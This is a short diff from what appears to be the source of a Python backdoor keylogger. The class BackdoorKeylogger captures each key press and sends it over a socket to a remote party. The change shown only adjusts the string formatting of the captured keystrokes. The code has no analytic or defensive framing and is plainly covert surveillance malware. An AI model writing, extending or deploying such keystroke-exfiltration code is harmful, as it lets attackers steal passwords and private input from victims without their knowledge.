@@ -42,10 +42,10 @@ class BackdoorKeylogger:
 
     def keylogger_press(self, key):
         try:
-            press = "Press {0}".format(key.char)
+            press = "Press {0} ".format(key.char)
             self.soc.sendall(press)
         except AttributeError:
-            press = "Press {0}".format(key)
+            press = "Press {0} ".format(key)
             self.soc.sendall(press)
 
     def keyloger_release(self, key):
